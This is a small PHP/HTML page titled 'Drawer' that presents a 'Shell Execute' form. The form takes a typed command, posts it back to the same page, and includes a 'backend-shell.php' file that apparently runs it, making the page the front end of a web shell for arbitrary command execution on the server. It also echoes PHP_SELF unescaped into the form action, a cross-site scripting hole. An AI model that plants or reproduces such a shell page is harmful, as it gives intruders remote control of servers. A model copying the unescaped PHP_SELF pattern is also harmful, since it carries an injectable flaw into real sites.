<html lang="ru">

<head>
    <title>Drawer</title>
</head>

<body style="font-size: 2em">

<h1> Shell Execute </h1>

        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
            Enter your command: <input type="text" name="code" />
            <input type="submit" />
        </form>

        <?php include_once ('./backend-shell.php'); ?>

</body>
</html>